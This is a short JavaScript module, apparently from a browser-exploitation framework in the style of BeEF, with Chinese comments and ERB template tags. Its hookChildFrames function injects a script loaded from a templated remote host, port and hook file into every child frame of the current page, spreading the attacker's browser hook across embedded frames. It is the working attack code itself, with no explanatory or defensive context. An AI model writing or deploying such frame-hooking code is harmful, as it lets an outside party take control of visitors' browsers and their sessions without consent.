//2019, 12/22, Queenie
// Hook On IFrame & Its ChildFrames
// web 以 q 作為 id

// 建立腳本物件
hookChildFrames: function() {

    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = '<%== @q_proto %>://<%== @q_host %>:<%== @q_port %><%== @hook_file %>';

    // Loop
    for(var i=0; i< self.frames.length; i++) {
        try{
            self.frames[i].document.body.appendChild(script);
        }catch(e){
            //...
        }
    }

}